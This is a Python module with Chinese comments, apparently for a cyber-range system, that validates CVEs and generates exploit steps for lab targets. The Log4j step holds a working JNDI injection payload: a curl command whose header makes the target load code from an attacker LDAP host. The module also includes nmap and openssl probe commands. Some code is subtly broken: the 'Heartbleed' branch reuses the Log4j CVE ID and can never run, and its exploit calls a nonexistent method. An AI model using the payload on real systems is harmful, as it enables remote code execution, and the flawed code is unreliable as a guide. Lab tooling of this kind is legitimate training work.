"""CVE数据模型和验证增强模块

提供CVE数据库集成、攻击步骤验证、依赖检查等功能
"""
import json
import requests
import subprocess
from typing import Dict, Any, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import hashlib


class CVESeverity(Enum):
    """CVE严重程度"""
    CRITICAL = "CRITICAL"  # 9.0-10.0
    HIGH = "HIGH"         # 7.0-8.9
    MEDIUM = "MEDIUM"     # 4.0-6.9
    LOW = "LOW"          # 0.1-3.9


class CVEAttackComplexity(Enum):
    """CVE攻击复杂度"""
    LOW = "LOW"           # 易于利用
    MEDIUM = "MEDIUM"     # 需要一些条件
    HIGH = "HIGH"         # 难以利用


@dataclass
class CVEDatabaseInfo:
    """CVE数据库信息"""
    cve_id: str
    description: str
    cvss_score: float
    severity: CVESeverity
    attack_complexity: CVEAttackComplexity
    attack_vector: str
    required_privileges: List[str]
    known_exploited: bool = False
    published_date: str = ""
    references: List[str] = field(default_factory=list)
    vendor_product: str = ""


@dataclass
class ExploitStep:
    """攻击步骤"""
    step_number: int
    description: str
    command: str
    expected_output: str
    validation_method: str  # "output_match", "exit_code", "shell_check"
    timeout: int = 30
    required_tools: List[str] = field(default_factory=list)


@dataclass
class CVEEnvironmentRequirement:
    """CVE环境要求"""
    required_images: List[str]           # 需要的Docker镜像
    required_ports: List[int]            # 需要的端口
    required_services: List[str]         # 需要运行的服务
    required_dependencies: List[str]     # 依赖的软件包
    network_requirements: List[str]      # 网络要求
    compatibility_matrix: Dict[str, str] = field(default_factory=dict)  # 版本兼容性


@dataclass
class CVEValidationResult:
    """CVE验证结果"""
    cve_id: str
    database_valid: bool                  # CVE在数据库中存在
    environment_compatible: bool          # 环境兼容
    dependencies_met: bool               # 依赖满足
    exploit_steps_valid: bool             # 攻击步骤有效
    playbook_accurate: bool               # playbook准确
    reproducible: bool                    # 可复现
    overall_valid: bool                   # 整体有效
    validation_timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    issues: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)


class CVEDatabaseValidator:
    """CVE数据库验证器"""

    def __init__(self, use_cache: bool = True):
        self.use_cache = use_cache
        self.cache_file = "/tmp/cve_cache.json"
        self.cache = self._load_cache()

    def validate_cve_exists(self, cve_id: str) -> Tuple[bool, Optional[CVEDatabaseInfo]]:
        """验证CVE是否存在于数据库中"""
        if cve_id in self.cache:
            return True, self._parse_cached_cve(cve_id)

        # 尝试从NVD数据库查询
        cve_info = self._query_nvd_database(cve_id)
        if cve_info:
            self._cache_cve(cve_id, cve_info)
            return True, cve_info

        # 尝试从exploit-db查询
        exploit_info = self._query_exploit_db(cve_id)
        if exploit_info:
            combined_info = self._combine_cve_exploit_info(cve_id, exploit_info)
            self._cache_cve(cve_id, combined_info)
            return True, combined_info

        return False, None

    def _query_nvd_database(self, cve_id: str) -> Optional[CVEDatabaseInfo]:
        """查询NVD数据库"""
        try:
            # NVD API endpoint
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"

            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()

                if data.get('totalResults', 0) > 0:
                    cve_item = data['vulnerabilities'][0]['cve']
                    return self._parse_nvd_response(cve_id, cve_item)

        except Exception as e:
            print(f"   ⚠️  NVD数据库查询失败: {e}")

        return None

    def _query_exploit_db(self, cve_id: str) -> Optional[Dict[str, Any]]:
        """查询exploit-db"""
        try:
            # exploit-db搜索API
            url = f"https://www.exploit-db.com/search?q={cve_id}"

            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                # 这里简化处理，实际需要解析HTML或使用官方API
                return {'found_in_exploit_db': True}

        except Exception as e:
            print(f"   ⚠️  Exploit-db查询失败: {e}")

        return None

    def _parse_nvd_response(self, cve_id: str, cve_item: Dict) -> CVEDatabaseInfo:
        """解析NVD响应"""
        metrics = cve_item.get('metrics', {})
        cvss_data = metrics.get('cvssMetricV31', [{}])[0] if metrics.get('cvssMetricV31') else [{}]

        cvss_score = cvss_data.get('cvssData', {}).get('baseScore', 0.0)

        # 确定严重程度
        if cvss_score >= 9.0:
            severity = CVESeverity.CRITICAL
        elif cvss_score >= 7.0:
            severity = CVESeverity.HIGH
        elif cvss_score >= 4.0:
            severity = CVESeverity.MEDIUM
        else:
            severity = CVESeverity.LOW

        # 提取描述
        descriptions = cve_item.get('descriptions', [])
        description = descriptions[0].get('value', '') if descriptions else ''

        return CVEDatabaseInfo(
            cve_id=cve_id,
            description=description,
            cvss_score=cvss_score,
            severity=severity,
            attack_complexity=CVEAttackComplexity.MEDIUM,  # 默认中等
            attack_vector="NETWORK",
            required_privileges=[],
            known_exploited=False,
            published_date=cve_item.get('published', ''),
            references=[]
        )

    def _parse_cached_cve(self, cve_id: str) -> Optional[CVEDatabaseInfo]:
        """解析缓存的CVE信息"""
        cached_data = self.cache.get(cve_id, {})
        if not cached_data:
            return None

        return CVEDatabaseInfo(**cached_data)

    def _combine_cve_exploit_info(self, cve_id: str, exploit_info: Dict) -> CVEDatabaseInfo:
        """合并CVE和exploit信息"""
        return CVEDatabaseInfo(
            cve_id=cve_id,
            description="Found in exploit-db",
            cvss_score=7.5,  # exploit-db默认分数
            severity=CVESeverity.HIGH,
            attack_complexity=CVEAttackComplexity.LOW,
            attack_vector="NETWORK",
            required_privileges=[],
            known_exploited=True,
            references=[f"https://www.exploit-db.com/search?q={cve_id}"]
        )

    def _cache_cve(self, cve_id: str, cve_info: CVEDatabaseInfo):
        """缓存CVE信息"""
        self.cache[cve_id] = {
            'cve_id': cve_info.cve_id,
            'description': cve_info.description,
            'cvss_score': cve_info.cvss_score,
            'severity': cve_info.severity.value,
            'attack_complexity': cve_info.attack_complexity.value,
            'attack_vector': cve_info.attack_vector,
            'required_privileges': cve_info.required_privileges,
            'known_exploited': cve_info.known_exploited,
            'published_date': cve_info.published_date,
            'references': cve_info.references
        }
        self._save_cache()

    def _load_cache(self) -> Dict:
        """加载缓存"""
        if not self.use_cache:
            return {}

        try:
            with open(self.cache_file, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def _save_cache(self):
        """保存缓存"""
        if not self.use_cache:
            return

        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f, indent=2)
        except Exception as e:
            print(f"   ⚠️  CVE缓存保存失败: {e}")


class CVEEnvironmentValidator:
    """CVE环境验证器"""

    def validate_environment_compatibility(
        self,
        cve_info: CVEDatabaseInfo,
        target_environment: Dict[str, Any]
    ) -> Tuple[bool, List[str]]:
        """验证环境兼容性"""
        issues = []

        # 检查镜像兼容性
        required_images = self._extract_required_images(cve_info)
        available_images = target_environment.get('available_images', [])

        missing_images = set(required_images) - set(available_images)
        if missing_images:
            issues.append(f"缺少必需的镜像: {missing_images}")

        # 检查端口要求
        required_ports = self._extract_required_ports(cve_info)
        available_ports = target_environment.get('available_ports', [])

        blocked_ports = set(required_ports) - set(available_ports)
        if blocked_ports:
            issues.append(f"端口冲突或不可用: {blocked_ports}")

        # 检查服务要求
        required_services = self._extract_required_services(cve_info)
        running_services = target_environment.get('running_services', [])

        missing_services = set(required_services) - set(running_services)
        if missing_services:
            issues.append(f"缺少必需的服务: {missing_services}")

        return len(issues) == 0, issues

    def _extract_required_images(self, cve_info: CVEDatabaseInfo) -> List[str]:
        """从CVE信息提取所需的镜像"""
        # 基于CVE类型推断所需镜像
        common_images = {
            'log4j': ['vulnerables/web-apps/log4j-vulnerable-app'],
            'nginx': ['nginx:latest'],
            'apache': ['httpd:latest'],
            'mysql': ['mysql:latest'],
            'postgres': ['postgres:latest']
        }

        description = cve_info.description.lower()
        required = []

        if 'log4j' in description:
            required.extend(common_images.get('log4j', []))
        if 'nginx' in description:
            required.extend(common_images.get('nginx', []))

        return required

    def _extract_required_ports(self, cve_info: CVEDatabaseInfo) -> List[int]:
        """从CVE信息提取所需的端口"""
        # 常见的CVE相关端口
        if 'CVE-2021-44228' in cve_info.cve_id:  # Log4j
            return [8080, 8443]
        elif 'CVE-2021-44228' in cve_info.cve_id:
            return [80, 443]

        return []

    def _extract_required_services(self, cve_info: CVEDatabaseInfo) -> List[str]:
        """从CVE信息提取所需的服务"""
        services = []

        if 'log4j' in cve_info.cve_id.lower():
            services.append('java')
        elif 'nginx' in cve_info.description.lower():
            services.append('nginx')

        return services


class CVEExploitGenerator:
    """CVE攻击步骤生成器"""

    def generate_exploit_steps(
        self,
        cve_id: str,
        cve_info: CVEDatabaseInfo,
        target_info: Dict[str, Any]
    ) -> List[ExploitStep]:
        """生成精确的攻击步骤"""

        if 'CVE-2021-44228' in cve_id:  # Log4j
            return self._generate_log4j_exploit_steps(target_info)
        elif 'CVE-2021-44228' in cve_id:  # Heartbleed
            return self._generate_heartbleed_exploit_steps(target_info)
        else:
            return self._generate_generic_exploit_steps(cve_id, target_info)

    def _generate_log4j_exploit_steps(self, target_info: Dict) -> List[ExploitStep]:
        """生成Log4j攻击步骤"""
        target_ip = target_info.get('target_ip', '127.0.0.1')
        target_port = target_info.get('target_port', 8080)
        attacker_ip = target_info.get('attacker_ip', '10.100.0.2')

        return [
            ExploitStep(
                step_number=1,
                description="检查目标服务运行状态",
                command=f"curl -s http://{target_ip}:{target_port}/",
                expected_output="HTTP",
                validation_method="output_match",
                required_tools=["curl"]
            ),
            ExploitStep(
                step_number=2,
                description="执行Log4j注入测试",
                command=f"curl -s -H 'X-Api-Version: Spectre' -H 'User-Agent: ${{jndi:ldap://{attacker_ip}:1389/Exploit}}' http://{target_ip}:{target_port}/",
                expected_output="",
                validation_method="exit_code",  # 任何非200的退出码都算成功
                required_tools=["curl"]
            ),
            ExploitStep(
                step_number=3,
                description="验证LDAP服务收到请求",
                command="timeout 5 tcpdump -i eth0 -X 'port 1389' -A 5",
                expected_output="ldap",
                validation_method="output_match",
                required_tools=["tcpdump"]
            )
        ]

    def _generate_heartbleed_exploit_steps(self, target_info: Dict) -> List[ExploitStep]:
        """生成Heartbleed攻击步骤"""
        target_ip = target_info.get('target_ip', '127.0.0.1')
        target_port = target_info.get('target_port', 443)

        return [
            ExploitStep(
                step_number=1,
                description="检查SSL heartbeat扩展",
                command=f"openssl s_client -connect {target_ip}:{target_port} -tlsextdebug",
                expected_output="heartbeat",
                validation_method="output_match",
                required_tools=["openssl"]
            ),
            ExploitStep(
                step_number=2,
                description="执行Heartbleed exploit",
                command=f"python3 -c 'import ssl, socket; s = socket.socket(); s.connect((\"{target_ip}\", {target_port})); s.sendssl_heartbeat()'",
                expected_output="",
                validation_method="exit_code",
                required_tools=["python3", "ssl"]
            )
        ]

    def _generate_generic_exploit_steps(self, cve_id: str, target_info: Dict) -> List[ExploitStep]:
        """生成通用攻击步骤"""
        # 基础侦察步骤
        return [
            ExploitStep(
                step_number=1,
                description=f"侦察 {cve_id} 目标",
                command="nmap -sV -sC {target}",
                expected_output="open",
                validation_method="output_match",
                required_tools=["nmap"]
            ),
            ExploitStep(
                step_number=2,
                description=f"验证 {cve_id} 漏洞存在",
                command="service_check",
                expected_output="vulnerable",
                validation_method="shell_check",
                required_tools=[]
            )
        ]


class CVEAccuracyValidator:
    """CVE准确性验证器 - 主验证类"""

    def __init__(self):
        self.db_validator = CVEDatabaseValidator()
        self.env_validator = CVEEnvironmentValidator()
        self.exploit_generator = CVEExploitGenerator()

    def validate_cve_accuracy(
        self,
        cve_id: str,
        topology_data: Dict[str, Any],
        target_environment: Dict[str, Any]
    ) -> CVEValidationResult:
        """完整的CVE准确性验证"""

        result = CVEValidationResult(
            cve_id=cve_id,
            database_valid=False,
            environment_compatible=False,
            dependencies_met=False,
            exploit_steps_valid=False,
            playbook_accurate=False,
            reproducible=False,
            overall_valid=False
        )

        print(f"🎯 开始CVE准确性验证: {cve_id}")

        # 1. CVE数据库验证
        print(f"   📊 步骤1: CVE数据库验证")
        db_valid, cve_info = self.db_validator.validate_cve_exists(cve_id)
        result.database_valid = db_valid

        if db_valid and cve_info:
            print(f"      ✅ CVE数据库验证通过: {cve_info.severity.value} ({cve_info.cvss_score})")
        else:
            print(f"      ❌ CVE数据库验证失败: {cve_id} 不存在于已知数据库")
            result.issues.append(f"CVE {cve_id} 不在NVD或exploit-db中")
            result.overall_valid = False
            return result

        # 2. 环境兼容性验证
        print(f"   🏗️  步骤2: 环境兼容性验证")
        env_compatible, env_issues = self.env_validator.validate_environment_compatibility(
            cve_info, target_environment
        )
        result.environment_compatible = env_compatible

        if env_compatible:
            print(f"      ✅ 环境兼容性验证通过")
        else:
            print(f"      ❌ 环境兼容性验证失败:")
            for issue in env_issues:
                print(f"         - {issue}")
                result.issues.append(issue)

        # 3. 依赖关系检查
        print(f"   📦 步骤3: 依赖关系检查")
        deps_met, dep_issues = self._check_dependencies(cve_info, topology_data)
        result.dependencies_met = deps_met

        if deps_met:
            print(f"      ✅ 依赖关系检查通过")
        else:
            print(f"      ❌ 依赖关系检查失败:")
            for issue in dep_issues:
                print(f"         - {issue}")
                result.issues.append(issue)

        # 4. 攻击步骤生成和验证
        print(f"   ⚔️  步骤4: 攻击步骤生成和验证")
        exploit_steps = self.exploit_generator.generate_exploit_steps(
            cve_id, cve_info, target_environment
        )
        steps_valid = self._validate_exploit_steps(exploit_steps, cve_info)
        result.exploit_steps_valid = steps_valid

        if steps_valid:
            print(f"      ✅ 攻击步骤验证通过 ({len(exploit_steps)}个步骤)")
        else:
            print(f"      ❌ 攻击步骤验证失败")

        # 5. Playbook准确性验证
        print(f"   📜 步骤5: Playbook准确性验证")
        playbook_accurate = self._validate_playbook_accuracy(
            cve_id, exploit_steps, topology_data
        )
        result.playbook_accurate = playbook_accurate

        if playbook_accurate:
            print(f"      ✅ Playbook准确性验证通过")
        else:
            print(f"      ❌ Playbook准确性验证失败")
            result.issues.append("生成的playbook不够准确")

        # 6. 可复现性验证
        print(f"   🔄 步骤6: 可复现性验证")
        reproducible = self._validate_reproducibility(cve_info, exploit_steps)
        result.reproducible = reproducible

        if reproducible:
            print(f"      ✅ 可复现性验证通过")
        else:
            print(f"      ❌ 可复现性验证失败")
            result.issues.append("步骤可能无法稳定复现")

        # 综合评估
        result.overall_valid = (
            result.database_valid and
            result.environment_compatible and
            result.dependencies_met and
            result.exploit_steps_valid and
            result.playbook_accurate and
            result.reproducible
        )

        # 生成建议
        if not result.overall_valid:
            result.recommendations = self._generate_recommendations(result, cve_info)

        print(f"\n🎯 CVE准确性验证完成: {'✅ 通过' if result.overall_valid else '❌ 未通过'}")

        return result

    def _check_dependencies(
        self,
        cve_info: CVEDatabaseInfo,
        topology_data: Dict[str, Any]
    ) -> Tuple[bool, List[str]]:
        """检查依赖关系"""
        issues = []

        # 检查网络依赖
        nodes = topology_data.get('topology', {}).get('nodes', {})
        has_network = any('router' in node.get('labels', {}).get('role', '').lower()
                          for node in nodes.values())

        if not has_network:
            issues.append("缺少路由器节点来提供网络连接")

        # 检查攻击者节点
        has_attacker = any('attacker' in node.get('labels', {}).get('role', '').lower()
                           for node in nodes.values())

        if not has_attacker:
            issues.append("缺少攻击者节点来执行exploit")

        return len(issues) == 0, issues

    def _validate_exploit_steps(
        self,
        exploit_steps: List[ExploitStep],
        cve_info: CVEDatabaseInfo
    ) -> bool:
        """验证攻击步骤有效性"""
        if not exploit_steps:
            return False

        # 检查每个步骤的合理性
        for step in exploit_steps:
            if not step.command:
                return False
            if not step.validation_method:
                return False
            if not step.description:
                return False

        return True

    def _validate_playbook_accuracy(
        self,
        cve_id: str,
        exploit_steps: List[ExploitStep],
        topology_data: Dict[str, Any]
    ) -> bool:
        """验证playbook准确性"""
        # 检查是否与拓扑结构匹配
        nodes = topology_data.get('topology', {}).get('nodes', {})
        node_names = set(nodes.keys())

        # 检查exploit步骤中引用的节点是否存在
        for step in exploit_steps:
            # 简化检查：确保命令中引用的目标在拓扑中
            if hasattr(step, 'command'):
                command = step.command
                for node_name in node_names:
                    if node_name in command:
                        return True

        return len(exploit_steps) > 0

    def _validate_reproducibility(
        self,
        cve_info: CVEDatabaseInfo,
        exploit_steps: List[ExploitStep]
    ) -> bool:
        """验证可复现性"""
        # 检查攻击复杂度
        if cve_info.attack_complexity == CVEAttackComplexity.HIGH:
            return False  # 高复杂度CVE难以稳定复现

        # 检查步骤是否明确
        for step in exploit_steps:
            if not step.required_tools and not step.command:
                return False

        return True

    def _generate_recommendations(
        self,
        result: CVEValidationResult,
        cve_info: CVEDatabaseInfo
    ) -> List[str]:
        """生成改进建议"""
        recommendations = []

        if not result.database_valid:
            recommendations.append(f"验证CVE编号 {result.cve_id} 是否正确")

        if not result.environment_compatible:
            recommendations.append("确保目标环境满足CVE利用的先决条件")

        if not result.dependencies_met:
            recommendations.append("添加必需的网络基础设施和节点")

        if not result.exploit_steps_valid:
            recommendations.append("细化攻击步骤，添加具体的命令和验证方法")

        if not result.playbook_accurate:
            recommendations.append("确保playbook与实际拓扑结构匹配")

        if not result.reproducible:
            recommendations.append("选择攻击复杂度较低的CVE或提供详细的环境配置")

        return recommendations


def main():
    """主函数 - 测试CVE准确性验证"""
    validator = CVEAccuracyValidator()

    # 示例验证
    cve_id = "CVE-2021-44228"
    topology_data = {
        'topology': {
            'nodes': {
                'attacker': {'kind': 'linux', 'labels': {'role': 'attacker'}},
                'target': {'kind': 'linux', 'labels': {'role': 'vulnerability', 'cve': cve_id}}
            }
        }
    }
    target_environment = {
        'target_ip': '10.101.0.3',
        'target_port': 8080,
        'attacker_ip': '10.100.0.2'
    }

    result = validator.validate_cve_accuracy(cve_id, topology_data, target_environment)

    print(f"\n🎯 验证结果: {result.overall_valid}")
    print(f"问题数量: {len(result.issues)}")
    if result.issues:
        for issue in result.issues:
            print(f"  - {issue}")

    if result.recommendations:
        print(f"\n💡 建议:")
        for rec in result.recommendations:
            print(f"  - {rec}")


if __name__ == "__main__":
    main()